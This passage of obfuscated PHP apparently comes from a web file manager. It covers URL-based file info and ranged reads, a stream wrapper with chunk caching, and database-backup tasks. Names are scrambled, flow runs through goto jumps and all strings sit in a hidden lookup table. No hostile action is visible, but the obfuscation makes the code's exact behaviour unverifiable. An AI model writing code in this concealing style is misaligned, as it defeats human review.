$bÒ–≈µïóœ; } public function fileOut($Fπ¯Ω§ñ‚ê, $DàŸÈ¶öÂà = false, $BÜÕÎ’ÊáÂ = false, $FØ“›ÏòŒ = '') { if ($this->isFileOutServer()) { return $this->fileOutServer($Fπ¯Ω§ñ‚ê, $DàŸÈ¶öÂà, $BÜÕÎ’ÊáÂ, $FØ“›ÏòŒ); } if (!$BÜÕÎ’ÊáÂ) { $BÜÕÎ’ÊáÂ = $this->pathThis($Fπ¯Ω§ñ‚ê); } $E≥›–¿‡–‘ = $DàŸÈ¶öÂà ? array($_SERVER[ú∫][1369] . rawurlencode($BÜÕÎ’ÊáÂ)) : array(); $C≥◊Û•—Êˆ = $this->link($Fπ¯Ω§ñ‚ê, $E≥›–¿‡–‘); $this->fileOutLink($C≥◊Û•—Êˆ); } public function fileOutServer($Eﬂóê‚Ñé‰, $bÉ¬ü ¡ôπ = false, $C≥ˆ≈£Î÷Ö = false, $CÁõ«˘∆´º = '') { parent::fileOut($Eﬂóê‚Ñé‰, $bÉ¬ü ¡ôπ, $C≥ˆ≈£Î÷Ö, $CÁõ«˘∆´º); } public function fileOutImage($dä‘µ˜ñ·⁄, $d°òù˘∆Ù÷ = 250) { $BŒ◊¶è®Óü = $this->link($dä‘µ˜ñ·⁄ . $_SERVER[ú∫][1370] . $d°òù˘∆Ù÷); $this->fileOutLink($BŒ◊¶è®Óü); } public function fileOutImageServer($E–Íﬂ›¨∫∂, $aµÃπŒ°¶ß = 250) { parent::fileOutImage($E–Íﬂ›¨∫∂, $aµÃπŒ°¶ß); } public function hashMd5($aûΩﬂÆΩ›√) { $eàÎ≠ãïÜñ =& $_SERVER[ú∫]; $aí˘¿ñûöé = $this->_objectMeta($aûΩﬂÆΩ›√); return isset($aí˘¿ñûöé[$eàÎ≠ãïÜñ[208]]) ? $aí˘¿ñûöé[$eàÎ≠ãïÜñ[208]] : !1; } public function size($f•ÎÖ∆§Ûã) { $dŸ§äƒëÆç = $this->objectMeta($f•ÎÖ∆§Ûã); return $dŸ§äƒëÆç ? $dŸ§äƒëÆç[$_SERVER[ú∫][78]] : 0; } public function info($d∫è«€≠´≠) { if ($this->isFolder($d∫è«€≠´≠)) { return $this->folderInfo($d∫è«€≠´≠); } else { if ($this->isFile($d∫è«€≠´≠)) { return $this->fileInfo($d∫è«€≠´≠); } } return !1; } public function exist($fúôíÇüáÜ) { return $this->isFile($fúôíÇüáÜ) || $this->isFolder($fúôíÇüáÜ); } public function isFile($cÌ‘À„œÜ‰) { return !$this->isFolder($cÌ‘À„œÜ‰) && $this->objectMeta($cÌ‘À„œÜ‰); } public function isFolder($Bî–ö¬◊Àâ) { return $this->cacheMethod($_SERVER[ú∫][199], $Bî–ö¬◊Àâ); } protected function objectMeta($FÓ”‘ˆÌˆà) { return $this->cacheMethod($_SERVER[ú∫][200], $FÓ”‘ˆÌˆà); } protected function _objectMeta($cÇﬁ‹ÖªÜÖ) { goto f“ÖòÁÂÑ…; f“ÖòÁÂÑ…: $cë«¢ê¡ÖÇ =& $_SERVER[ú∫]; if ($cÇﬁ‹ÖªÜÖ == $cë«¢ê¡ÖÇ[33] || $cÇﬁ‹ÖªÜÖ == $cë«¢ê¡ÖÇ[8]) { return array(); } $dä∂‡ÀÊÓﬁ = $this->ussRequest($cÇﬁ‹ÖªÜÖ, $cë«¢ê¡ÖÇ[1371]); goto cÚûÃ≠åêÜ; CàÚ¶–≈‡π: $BÃ£àÂëŸË = array($cë«¢ê¡ÖÇ[29] => isset($Cäè…è∫”√[$cë«¢ê¡ÖÇ[1372]]) ? $Cäè…è∫”√[$cë«¢ê¡ÖÇ[1372]] : null, $cë«¢ê¡ÖÇ[78] => isset($Cäè…è∫”√[$cë«¢ê¡ÖÇ[1373]]) ? $Cäè…è∫”√[$cë«¢ê¡ÖÇ[1373]] : null, $cë«¢ê¡ÖÇ[208] => isset($Cäè…è∫”√[$cë«¢ê¡ÖÇ[1374]]) ? $Cäè…è∫”√[$cë«¢ê¡ÖÇ[1374]] : null, $cë«¢ê¡ÖÇ[1341] => isset($Cäè…è∫”√[$cë«¢ê¡ÖÇ[1375]]) ? $Cäè…è∫”√[$cë«¢ê¡ÖÇ[1375]] : null); $BÃ£àÂëŸË[$cë«¢ê¡ÖÇ[1342]] = isset($Cäè…è∫”√[$cë«¢ê¡ÖÇ[1376]]) ? strtotime($Cäè…è∫”√[$cë«¢ê¡ÖÇ[1376]]) : $BÃ£àÂëŸË[$cë«¢ê¡ÖÇ[1341]]; return $BÃ£àÂëŸË; goto A•ﬁ±ß≤«Ñ; cÚûÃ≠åêÜ: if (!$dä∂‡ÀÊÓﬁ[$cë«¢ê¡ÖÇ[1086]]) { return null; } $Cäè…è∫”√ = isset($dä∂‡ÀÊÓﬁ[$cë«¢ê¡ÖÇ[1088]]) ? $dä∂‡ÀÊÓﬁ[$cë«¢ê¡ÖÇ[1088]] : array(); if (!isset($Cäè…è∫”√[$cë«¢ê¡ÖÇ[1372]])) { return null; } goto CàÚ¶–≈‡π; A•ﬁ±ß≤«Ñ: } protected function _isFolder($d—Û„π›◊‹) { $Bïü’ÂÙ·ä =& $_SERVER[ú∫]; if ($d—Û„π›◊‹ == $Bïü’ÂÙ·ä[33] || $d—Û„π›◊‹ == $Bïü’ÂÙ·ä[8]) { return !0; } $Båë üüÏ¶ = $this->_objectMeta($d—Û„π›◊‹); return isset($Båë üüÏ¶[$Bïü’ÂÙ·ä[29]]) && $Båë üüÏ¶[$Bïü’ÂÙ·ä[29]] == $Bïü’ÂÙ·ä[77] ? !0 : !1; } } class PathDriverUrl extends PathDriverBase { static $_cacheHeader = array(); public function __construct($F«⁄ÆË§ﬂ¬ = false) { } public function exist($dΩ‰›¢Ÿô») { $a£∑”úªÉÀ = $this->info($dΩ‰›¢Ÿô»); return $a£∑”úªÉÀ[$_SERVER[ú∫][195]]; } public function isFile($Eü≠¢Ã´Üã) { $BÁÑÙáøá∆ = $this->info($Eü≠¢Ã´Üã); return $BÁÑÙáøá∆[$_SERVER[ú∫][195]]; } public function isFolder($bç∞ù≈ÜÔâ) { return !1; } public function size($E¥ŸòﬂáÜÖ) { $EÔ∏§·Ç∞å = $this->info($E¥ŸòﬂáÜÖ); return $EÔ∏§·Ç∞å[$_SERVER[ú∫][78]]; } public function info($bÜ¡§˘§ó¨) { return $this->infoParse($bÜ¡§˘§ó¨); } public function infoAuth($D·Ù™⁄ îÍ) { return $this->infoParse($D·Ù™⁄ îÍ); } public function infoWithChildren($c—˜¿¥†Óß) { return $this->infoParse($c—˜¿¥†Óß); } public function infoFull($B‹ó±Öã˘) { return $this->infoParse($B‹ó±Öã˘); } private function infoParse($aùõºÎƒ´§) { $CÿÏ…ÎÿáÈ =& $_SERVER[ú∫]; $f•áÖûåî◊ = $this->header($aùõºÎƒ´§); if (!$f•áÖûåî◊ || !$f•áÖûåî◊[$CÿÏ…ÎÿáÈ[710]]) { return !1; } $Fıü»ﬂ≠∞é = _get($f•áÖûåî◊, $CÿÏ…ÎÿáÈ[335], 0); $fßÉáœ¿¨Ê = array($CÿÏ…ÎÿáÈ[28] => $f•áÖûåî◊[$CÿÏ…ÎÿáÈ[28]], $CÿÏ…ÎÿáÈ[76] => $aùõºÎƒ´§, $CÿÏ…ÎÿáÈ[29] => $CÿÏ…ÎÿáÈ[193], $CÿÏ…ÎÿáÈ[78] => intval($Fıü»ﬂ≠∞é), $CÿÏ…ÎÿáÈ[168] => get_path_ext($f•áÖûåî◊[$CÿÏ…ÎÿáÈ[28]]), $CÿÏ…ÎÿáÈ[1256] => $Fıü»ﬂ≠∞é > 0 && $f•áÖûåî◊[$CÿÏ…ÎÿáÈ[1377]], $CÿÏ…ÎÿáÈ[1257] => !1); return $fßÉáœ¿¨Ê; } private function header($e––£◊∑«¯) { goto a±ßﬂ√„Øß; FáﬁË‘≤€Ü: return self::$_cacheHeader[$e––£◊∑«¯]; goto B°£™±«µ≠; a±ßﬂ√„Øß: $bââÙπÉâ‘ =& $_SERVER[ú∫]; if (isset(self::$_cacheHeader[$e––£◊∑«¯])) { return self::$_cacheHeader[$e––£◊∑«¯]; } $f¥πõ≤†ë› = isset($GLOBALS[$bââÙπÉâ‘[1378]]) ? $GLOBALS[$bââÙπÉâ‘[1378]] : !1; goto EÂÖê‚æ¿ñ; EÂÖê‚æ¿ñ: $GLOBALS[$bââÙπÉâ‘[1378]] = !0; self::$_cacheHeader[$e––£◊∑«¯] = url_header($e––£◊∑«¯); $GLOBALS[$bââÙπÉâ‘[1378]] = $f¥πõ≤†ë›; goto FáﬁË‘≤€Ü; B°£™±«µ≠: } public function hashSimple($Cîòÿ‘Ñî», $eŒÖÂ´ª£≥ = false) { goto D˘£ü‡Êíà; cïÖ…µ·“î: $B˜º◊ñ£¿≥ .= $this->fileSubstr($Cîòÿ‘Ñî», $C∏Ö†ıíä“ - $c‡¶Â–Üî‘, $c‡¶Â–Üî‘); return md5($B˜º◊ñ£¿≥) . $C∏Ö†ıíä“; goto d≤Œ¨¶èèã; A∫´ É≥ˆ§: $C∏Ö†ıíä“ = $F√Ãßòº˘ô[$C•âÉ‹“Ôò[78]]; $c‡¶Â–Üî‘ = 200; $A≤–¯£ÛÑÙ = 50; goto fƒòò“üÛº; fƒòò“üÛº: if ($C∏Ö†ıíä“ <= $c‡¶Â–Üî‘ * $A≤–¯£ÛÑÙ) { return md5($this->fileSubstr($Cîòÿ‘Ñî», 0, $C∏Ö†ıíä“)) . $C∏Ö†ıíä“; } $aû°ÏÌØâ” = intval($C∏Ö†ıíä“ / $A≤–¯£ÛÑÙ); $B˜º◊ñ£¿≥ = $C•âÉ‹“Ôò[33]; goto B°é–¿îüÁ; D˘£ü‡Êíà: $C•âÉ‹“Ôò =& $_SERVER[ú∫]; $F√Ãßòº˘ô = $this->info($Cîòÿ‘Ñî»); if (!$F√Ãßòº˘ô || !$F√Ãßòº˘ô[$C•âÉ‹“Ôò[195]]) { return !1; } goto A∫´ É≥ˆ§; B°é–¿îüÁ: $F›≠¡«“◊å = timeFloat(); $a™÷èıâ–Ô = 15; for ($b¡¶πµ•´∞ = 0; $b¡¶πµ•´∞ < $A≤–¯£ÛÑÙ; $b¡¶πµ•´∞++) { if (timeFloat() - $F›≠¡«“◊å > $a™÷èıâ–Ô) { return !1; } $Eì‹ñ—Œ™ê = $this->fileSubstr($Cîòÿ‘Ñî», $aû°ÏÌØâ” * $b¡¶πµ•´∞, $c‡¶Â–Üî‘); if (!$Eì‹ñ—Œ™ê) { return !1; } $B˜º◊ñ£¿≥ .= $Eì‹ñ—Œ™ê; } goto cïÖ…µ·“î; d≤Œ¨¶èèã: } public function getContent($dì∑áŸ∞ëå) { return $this->fileSubstr($dì∑áŸ∞ëå); } public function fileSubstr($dﬁôú≥œƒ®, $cå¶ºùÿ¶¢ = 0, $aÇóºèâûî = -1) { goto E¯÷•ÜÔœ‡; E¯÷•ÜÔœ‡: $Cáãå÷Áø◊ =& $_SERVER[ú∫]; $bø´Àºç¿– = $this->info($dﬁôú≥œƒ®); if (!$bø´Àºç¿– || !$bø´Àºç¿–[$Cáãå÷Áø◊[195]] && $bø´Àºç¿–[$Cáãå÷Áø◊[78]] > 1024 * 1024 * 10) { return !1; } goto eœå•ŒπàÚ; A±ëÑëÙ´ﬁ: $Eä™Ì†£ÛÚ = url_request($dﬁôú≥œƒ®, $Cáãå÷Áø◊[228], !1, $d»ÇëË¥ê≠, !1, !1, 1); return $Eä™Ì†£ÛÚ[$Cáãå÷Áø◊[1088]] ? $Eä™Ì†£ÛÚ[$Cáãå÷Áø◊[1088]] : $Cáãå÷Áø◊[33]; goto Aﬁ∑€ÛÖå—; eœå•ŒπàÚ: if ($aÇóºèâûî === -1) { $aÇóºèâûî = $bø´Àºç¿–[$Cáãå÷Áø◊[78]]; } if ($aÇóºèâûî == 0) { return $Cáãå÷Áø◊[33]; } $d»ÇëË¥ê≠ = array($Cáãå÷Áø◊[1379] . $cå¶ºùÿ¶¢ . $Cáãå÷Áø◊[744] . ($cå¶ºùÿ¶¢ + $aÇóºèâûî - 1)); goto A±ëÑëÙ´ﬁ; Aﬁ∑€ÛÖå—: } public function download($cˆ•”ÔÕ´Ò, $cÖÏîøÆ≤É) { Downloader::start($cˆ•”ÔÕ´Ò, $cÖÏîøÆ≤É); return $cÖÏîøÆ≤É; } } class StreamWrapperIO { private $path; private $info; private $pose = 0; static $_fopenCache = array(); static $_chunkBuffer = array(); private $timeStart = 0; function stream_open($fËˆÇÏÿŒÜ, $c—≈õêŒÃÎ = '') { goto a™”ÌÃûÊ‰; c‹Â àˆØ˘: $this->pathOpen = $fËˆÇÏÿŒÜ; if (!$this->info) { return !1; } if (count(self::$_chunkBuffer) > 100) { self::$_chunkBuffer = null; self::$_chunkBuffer = array(); } goto D·Á∏éæ®˜; D·Á∏éæ®˜: if (!isset(self::$_chunkBuffer[$fËˆÇÏÿŒÜ])) { self::$_chunkBuffer[$fËˆÇÏÿŒÜ] = array(); } self::$_fopenCache[$this->pathOpen] = $this; return $this->info ? !0 : !1; goto Bó≠±®∑Øß; a™”ÌÃûÊ‰: $this->info = $this->info($fËˆÇÏÿŒÜ); $this->timeStart = timeFloat(); $this->path = $this->info[$_SERVER[ú∫][76]]; goto c‹Â àˆØ˘; Bó≠±®∑Øß: } function stream_read($D‘•ÌØ≤◊á) { $CæÑèëΩêÀ = $this->fileSubstr($this->pose, $D‘•ÌØ≤◊á); $this->pose += strlen($CæÑèëΩêÀ); return $CæÑèëΩêÀ; } public function stream_tell() { return $this->pose; } public function stream_seek($DãÀÈπ±Û∆, $CΩΩå“¨†ë) { $dáßä≤àΩï =& $_SERVER[ú∫]; if ($CΩΩå“¨†ë == SEEK_SET) { $this->pose = $DãÀÈπ±Û∆; } else { if ($CΩΩå“¨†ë == SEEK_CUR) { $this->pose += $DãÀÈπ±Û∆; } else { if ($CΩΩå“¨†ë == SEEK_END) { $this->pose = $this->info[$dáßä≤àΩï[78]] + intval($DãÀÈπ±Û∆); } } } if ($DãÀÈπ±Û∆ < 0) { $this->pose = $this->info[$dáßä≤àΩï[78]] + $DãÀÈπ±Û∆; } return !0; } public function stream_eof() { return $this->pose >= $this->info[$_SERVER[ú∫][78]]; } public function stream_close() { unset(self::$_fopenCache[$this->pathOpen]); return !0; } public function url_stat($eöﬁÉ‡∫»π, $AÊÓŒ‰Î•Ç) { $d¯øÚ§€èÓ =& $_SERVER[ú∫]; $cÇ¨ã›¢Ï‡ = $this->info($eöﬁÉ‡∫»π); return array($d¯øÚ§€èÓ[1380] => 0, $d¯øÚ§€èÓ[1381] => 0, $d¯øÚ§€èÓ[12] => 32768 + 511, $d¯øÚ§€èÓ[1382] => 0, $d¯øÚ§€èÓ[1383] => 0, $d¯øÚ§€èÓ[1384] => 0, $d¯øÚ§€èÓ[1385] => 0, $d¯øÚ§€èÓ[78] => $cÇ¨ã›¢Ï‡[$d¯øÚ§€èÓ[78]], $d¯øÚ§€èÓ[1386] => $cÇ¨ã›¢Ï‡[$d¯øÚ§€èÓ[1255]], $d¯øÚ§€èÓ[1342] => $cÇ¨ã›¢Ï‡[$d¯øÚ§€èÓ[84]], $d¯øÚ§€èÓ[1341] => $cÇ¨ã›¢Ï‡[$d¯øÚ§€èÓ[194]], $d¯øÚ§€èÓ[1387] => 0, $d¯øÚ§€èÓ[1388] => 0); } static $fileInfo = array(); public function info($aÚê¿ùçäË) { $dœ‹·◊·Ñè = $_SERVER[ú∫][1389]; if (isset(self::$fileInfo[$aÚê¿ùçäË])) { return self::$fileInfo[$aÚê¿ùçäË]; } if (substr($aÚê¿ùçäË, 0, strlen($dœ‹·◊·Ñè)) != $dœ‹·◊·Ñè) { return !1; } self::$fileInfo[$aÚê¿ùçäË] = IO::info(substr($aÚê¿ùçäË, strlen($dœ‹·◊·Ñè))); return self::$fileInfo[$aÚê¿ùçäË]; } public static function read($aÀ≈Ñ∏êé˜, $a≥Øê©’√∫, $fµ˘Ì§Ê∑Ï) { if (!isset(self::$_fopenCache[$aÀ≈Ñ∏êé˜])) { $fúçÉ•À™‰ = new StreamWrapperIO(); $fúçÉ•À™‰->stream_open($aÀ≈Ñ∏êé˜); self::$_fopenCache[$aÀ≈Ñ∏êé˜] = $fúçÉ•À™‰; } $fúçÉ•À™‰ = self::$_fopenCache[$aÀ≈Ñ∏êé˜]; return $fúçÉ•À™‰->fileSubstr($a≥Øê©’√∫, $fµ˘Ì§Ê∑Ï); } public static function _read($A≈ºÀ˜÷≥‚, $fÃÕÈÖü–ñ, $e¢…ìÍåü≤) { goto b”ºˆêÓ»¢; b”ºˆêÓ»¢: $fÓäèÉ‹ÜØ =& $_SERVER[ú∫]; $d⁄Ã¬ãÖﬂ∆ = fopen($A≈ºÀ˜÷≥‚, $fÓäèÉ‹ÜØ[1259]); if (!$d⁄Ã¬ãÖﬂ∆) { return $fÓäèÉ‹ÜØ[33]; } goto AÍ¯ÃŒè˜; AÍ¯ÃŒè˜: $Bå›î©å≥Ù = 8192; fseek($d⁄Ã¬ãÖﬂ∆, $fÃÕÈÖü–ñ, SEEK_SET); $bìà„«ƒ≈â = $fÓäèÉ‹ÜØ[33]; goto cÒﬁÏ∆Û¿˜; cÒﬁÏ∆Û¿˜: $D˘—¶ë‰êù = 0; while ($D˘—¶ë‰êù < $e¢…ìÍåü≤) { $bÂäÓàêÈö = min($Bå›î©å≥Ù, $e¢…ìÍåü≤ - $D˘—¶ë‰êù); $bìà„«ƒ≈â .= fread($d⁄Ã¬ãÖﬂ∆, $bÂäÓàêÈö); $D˘—¶ë‰êù += $bÂäÓàêÈö; } fclose($d⁄Ã¬ãÖﬂ∆); goto fÑ¥„øŒÖ≤; fÑ¥„øŒÖ≤: return $bìà„«ƒ≈â; goto Eì¬¢õ‹∆–; Eì¬¢õ‹∆–: } public function fileSubstr($EÌÃãú™±‡, $cï˘ÂãçâÛ) { goto B¡Ú’âíπﬁ; F‚öﬁ‡Ìº…: if ($EÌÃãú™±‡ + $cï˘ÂãçâÛ > $FÃÕÜÏü◊¢) { $cï˘ÂãçâÛ = $FÃÕÜÏü◊¢ - $EÌÃãú™±‡; } if ($cï˘ÂãçâÛ <= 0) { return $Aïû‡ı‡ßè[33]; } if ($EÌÃãú™±‡ < 0 || $EÌÃãú™±‡ >= $FÃÕÜÏü◊¢ || $cï˘ÂãçâÛ <= 0 || $cï˘ÂãçâÛ > 1024 * 1024 * 5) { throw new Exception("\151\x6f\106\x69\154\145\x52\145\x61\x64\x20\145\x72\162\x6f\162\x21\40\x73\x74\141\x72\164\75{$EÌÃãú™±‡}\73\154\145\x6e\x67\x74\x68\x3d{$cï˘ÂãçâÛ}\x3b\40\163\151\x7a\145\x3d{$FÃÕÜÏü◊¢}\x3b"); } goto CÍ‹π„®ï•; FÓÑÛÑﬂ§˜: $A±—¬ç¯‚” = ceil(($EÌÃãú™±‡ + $cï˘ÂãçâÛ) / $cÑæ™‹’€∑) * $cÑæ™‹’€∑ - $A†—¶‹°®ª; $C¥–É¨·§å = IO::fileSubstr($this->path, $A†—¶‹°®ª, $A±—¬ç¯‚”); $d¨»‰æ‡˘º[$A†—¶‹°®ª . $Aïû‡ı‡ßè[33]] = $C¥–É¨·§å; goto B†¬Ì∂æ≥í; CÍ‹π„®ï•: $cÑæ™‹’€∑ = 64 * 1024; $d¨»‰æ‡˘º =& self::$_chunkBuffer[$this->path]; if (!$d¨»‰æ‡˘º) { $d¨»‰æ‡˘º = array(); } goto Fó§∫¬•≈–; eôœ∂àŸ—ç: $cì‰Ü–∂™Ò = $cï˘ÂãçâÛ; if ($EÌÃãú™±‡ < 0) { $EÌÃãú™±‡ = $FÃÕÜÏü◊¢ + $EÌÃãú™±‡; } if ($cï˘ÂãçâÛ === !1) { $cï˘ÂãçâÛ = $FÃÕÜÏü◊¢ - $EÌÃãú™±‡; } goto F‚öﬁ‡Ìº…; B†¬Ì∂æ≥í: ksort($d¨»‰æ‡˘º); $CåÔÂåìÉ≥ = substr($C¥–É¨·§å, $EÌÃãú™±‡ - $A†—¶‹°®ª, $cï˘ÂãçâÛ); return $CåÔÂåìÉ≥; goto dÀäùÎï¿™; Fó§∫¬•≈–: $d’ÜßÒã⁄¿ = 0; $c„ÂˆÚ∆í› = 0; $fé±†í·ª§ = $Aïû‡ı‡ßè[33]; goto a…Ë¨›»Â…; B¡Ú’âíπﬁ: $Aïû‡ı‡ßè =& $_SERVER[ú∫]; $FÃÕÜÏü◊¢ = $this->info[$Aïû‡ı‡ßè[78]]; $B‘äùèﬁÂˆ = $EÌÃãú™±‡; goto eôœ∂àŸ—ç; a…Ë¨›»Â…: foreach ($d¨»‰æ‡˘º as $d’ÜßÒã⁄¿ => $fé±†í·ª§) { $d’ÜßÒã⁄¿ = intval($d’ÜßÒã⁄¿); $c„ÂˆÚ∆í› = $d’ÜßÒã⁄¿ + strlen($fé±†í·ª§); if ($EÌÃãú™±‡ >= $c„ÂˆÚ∆í›) { continue; } if ($EÌÃãú™±‡ >= $d’ÜßÒã⁄¿ && $EÌÃãú™±‡ + $cï˘ÂãçâÛ <= $c„ÂˆÚ∆í›) { return substr($fé±†í·ª§, $EÌÃãú™±‡ - $d’ÜßÒã⁄¿, $cï˘ÂãçâÛ); } break; } if (count($d¨»‰æ‡˘º) > 100 || timeFloat() - $this->timeStart > 2.0) { $this->log($Aïû‡ı‡ßè[1390], $Aïû‡ı‡ßè[1391] . count($d¨»‰æ‡˘º) . "\x3b\163\x74\x61\x72\x74\75{$EÌÃãú™±‡}\54\154\x65\156\147\x74\x68\75{$cï˘ÂãçâÛ}\x3b\160\157\x73\145\x3a{$d’ÜßÒã⁄¿}\176{$c„ÂˆÚ∆í›}"); throw new Exception($Aïû‡ı‡ßè[1392]); } $A†—¶‹°®ª = intval($EÌÃãú™±‡ / $cÑæ™‹’€∑) * $cÑæ™‹’€∑; goto FÓÑÛÑﬂ§˜; dÀäùÎï¿™: } private function log($Bñ∆≈á˘Û∑, $Eπî∆ñüäÆ) { $dˆõÖõêë´ =& $_SERVER[ú∫]; $CáÑº‹≠§• = timeFloat() - $this->timeStart; write_log(sprintf($dˆõÖõêë´[1393], $Bñ∆≈á˘Û∑, $this->info[$dˆõÖõêë´[28]], $CáÑº‹≠§•, $Eπî∆ñüäÆ), $dˆõÖõêë´[1078]); } } goto DñÓè–≈∞î; b ô•˜Ú¶‡: class BackupDb { protected static $io; protected static $name; public function __construct() { } public function index() { goto a∆¿∏˘·∞Æ; C»éÇÊ©¢»: foreach ($d—øÕç◊ÇÎ as $câ÷ —€¡£) { $Bï”≤ÖØÂê += $f†π‘∑ã§ë->model($câ÷ —€¡£)->count(); } $b≤¥øŒ∆Ø∞ = new Task($D≈— ≠≥ØÉ[741], $D≈— ≠≥ØÉ[742], $Bï”≤ÖØÂê, LNG($D≈— ≠≥ØÉ[743]) . $D≈— ≠≥ØÉ[744] . LNG($D≈— ≠≥ØÉ[745])); foreach ($d—øÕç◊ÇÎ as $câ÷ —€¡£) { $AÍ¨ÎÏ◊Éé = $Cäµ∫ŸÏ¢Ì . $câ÷ —€¡£ . $D≈— ≠≥ØÉ[746]; $d≥ØèêÑ◊ß = null; if ($câ÷ —€¡£ == $D≈— ≠≥ØÉ[747] && (!isset($d‹ıíÀÁÙÎ[$D≈— ≠≥ØÉ[715]]) || $d‹ıíÀÁÙÎ[$D≈— ≠≥ØÉ[715]] == $D≈— ≠≥ØÉ[191])) { $d≥ØèêÑ◊ß = self::$io; } $F˘‘¶≤·±∂ += $f†π‘∑ã§ë->sqlFromDb($câ÷ —€¡£, $AÍ¨ÎÏ◊Éé, $b≤¥øŒ∆Ø∞, $d≥ØèêÑ◊ß); } goto e¥¥∏âÂÚ“; B√ëù‰õ∏˜: $Bï”≤ÖØÂê = $F˘‘¶≤·±∂ = 0; try { $d—øÕç◊ÇÎ = $f†π‘∑ã§ë->db()->getTables(); } catch (Exception $eãè•˘ƒ≥á) { return !1; } $d—øÕç◊ÇÎ = array_diff($d—øÕç◊ÇÎ, array($D≈— ≠≥ØÉ[739], $D≈— ≠≥ØÉ[740])); goto C»éÇÊ©¢»; Cœ®Àë¨§Ã: Backup::set($a˘Ã‹¢ıÊ©); if ($Bï”≤ÖØÂê > $F˘‘¶≤·±∂) { write_log(array($D≈— ≠≥ØÉ[753], $a˘Ã‹¢ıÊ©), $D≈— ≠≥ØÉ[742]); return !1; } return !0; goto Eí†ÂÖ€√Ó; a‡‡ô∂‚Óå: $f†π‘∑ã§ë = new DbManage($Bı¬ûûäÚŒ, $d∏áŒ•±âÇ); $a˘Ã‹¢ıÊ© = array($D≈— ≠≥ØÉ[736] => $d∏áŒ•±âÇ, $D≈— ≠≥ØÉ[737] => time()); Backup::set($a˘Ã‹¢ıÊ©); goto aõƒ¶çºøÿ; a∆¿∏˘·∞Æ: $D≈— ≠≥ØÉ =& $_SERVER[ú∫]; $d‹ıíÀÁÙÎ = Backup::get(); self::$io = $d‹ıíÀÁÙÎ[$D≈— ≠≥ØÉ[712]]; goto a∂Ó∑óªÃ—; e¥¥∏âÂÚ“: if (isset($b≤¥øŒ∆Ø∞->task[$D≈— ≠≥ØÉ[748]])) { $Dæé´òøç¬ = $b≤¥øŒ∆Ø∞->task[$D≈— ≠≥ØÉ[748]] ? $b≤¥øŒ∆Ø∞->task[$D≈— ≠≥ØÉ[748]] : timeFloat(); $FÇÍÌ¿ä‚ü = $Dæé´òøç¬ - $b≤¥øŒ∆Ø∞->task[$D≈— ≠≥ØÉ[749]]; if ($FÇÍÌ¿ä‚ü >= 0.2) { $Bï”≤ÖØÂê += 1; } } $b≤¥øŒ∆Ø∞->end(); $a˘Ã‹¢ıÊ© = array($D≈— ≠≥ØÉ[736] => $d∏áŒ•±âÇ, $D≈— ≠≥ØÉ[733] => 1, $D≈— ≠≥ØÉ[750] => $Bï”≤ÖØÂê, $D≈— ≠≥ØÉ[751] => $F˘‘¶≤·±∂, $D≈— ≠≥ØÉ[752] => time()); goto Cœ®Àë¨§Ã; aõƒ¶çºøÿ: $Cäµ∫ŸÏ¢Ì = $this->tmpFilesPath() . $D≈— ≠≥ØÉ[738] . self::$name . $D≈— ≠≥ØÉ[8]; del_dir($Cäµ∫ŸÏ¢Ì); mk_dir($Cäµ∫ŸÏ¢Ì); goto B√ëù‰õ∏˜; a∂Ó∑óªÃ—: self::$name = $d‹ıíÀÁÙÎ[$D≈— ≠≥ØÉ[28]]; $Bı¬ûûäÚŒ = $GLOBALS[$D≈— ≠≥ØÉ[6]][$D≈— ≠≥ØÉ[17]]; $d∏áŒ•±âÇ = $this->_dbType($Bı¬ûûäÚŒ); goto a‡‡ô∂‚Óå; Eí†ÂÖ€√Ó: } private function _dbType($d…ﬁΩàÑ˜ˆ) { goto E—Ω¡∂©÷é; c◊ÉàŒ´„ã: return $aàÇ…’‡ÇÙ; goto BªÎáíôàø; E—Ω¡∂©÷é: $e◊®ˆÀƒ÷Æ =& $_SERVER[ú∫]; $d…ﬁΩàÑ˜ˆ = array_change_key_case($d…ﬁΩàÑ˜ˆ); $aàÇ…’‡ÇÙ = $d…ﬁΩàÑ˜ˆ[$e◊®ˆÀƒ÷Æ[754]]; goto AçÀËä‚ú‰; AçÀËä‚ú‰: if ($aàÇ…’‡ÇÙ == $e◊®ˆÀƒ÷Æ[755]) { $eÑôâ‚ﬂÎÆ = explode($e◊®ˆÀƒ÷Æ[4], $d…ﬁΩàÑ˜ˆ[$e◊®ˆÀƒ÷Æ[756]]); $aàÇ…’‡ÇÙ = $eÑôâ‚ﬂÎÆ[0]; } $cêüœ©Çøî = array($e◊®ˆÀƒ÷Æ[757] => $e◊®ˆÀƒ÷Æ[9], $e◊®ˆÀƒ÷Æ[758] => $e◊®ˆÀƒ÷Æ[759]); if (isset($cêüœ©Çøî[$aàÇ…’‡ÇÙ])) { $aàÇ…’‡ÇÙ = $cêüœ©Çøî[$aàÇ…’‡ÇÙ]; } goto c◊ÉàŒ´„ã; BªÎáíôàø: } private function tmpFilesPath() { $bú¿Õî”√Á =& $_SERVER[ú∫]; $dËçÇæâ∆— = TEMP_FILES; if ($GLOBALS[$bú¿Õî”√Á[6]][$bú¿Õî”√Á[88]][$bú¿Õî”√Á[760]]) { $dËçÇæâ∆— = $GLOBALS[$bú¿Õî”√Á[6]][$bú¿Õî”√Á[88]][$bú¿Õî”√Á[760]]; if (!mk_dir($dËçÇæâ∆—) || !is_writable($dËçÇæâ∆—) || !IO::mkfile($dËçÇæâ∆— . $bú¿Õî”√Á[761])) { $dËçÇæâ∆— = TEMP_FILES; } } return $dËçÇæâ∆—; } } class BackupDbFile { public function __construct() { } public function index() { goto aÉÈå†´·î; Cìé¬¯äàÖ: $EÓÖÂµ…Á´ = new TaskFileTransfer($EÕîƒ‚ØÃÖ[764], $EÕîƒ‚ØÃÖ[742], count($fÿÕî ≠’ﬁ), LNG($EÕîƒ‚ØÃÖ[743]) . $EÕîƒ‚ØÃÖ[440] . LNG($EÕîƒ‚ØÃÖ[745]) . $EÕîƒ‚ØÃÖ[765]); $EÓÖÂµ…Á´->task[$EÕîƒ‚ØÃÖ[723]] = $Cûı‹ı» Ú; foreach ($f◊ó¨Â√òÀ[$EÕîƒ‚ØÃÖ[74]] as $EÍ´ìÌ≠ßà) { $AÔ”ìç©ëÏ = IO::move($EÍ´ìÌ≠ßà[$EÕîƒ‚ØÃÖ[76]], $e«ﬂÜï≠°£); if (!$AÔ”ìç©ëÏ) { $EÓÖÂµ…Á´->end(); $bæòëõäå≤ = IO::getLastError($EÕîƒ‚ØÃÖ[766] . $EÍ´ìÌ≠ßà[$EÕîƒ‚ØÃÖ[76]] . $EÕîƒ‚ØÃÖ[767] . $e«ﬂÜï≠°£ . $EÕîƒ‚ØÃÖ[504]); 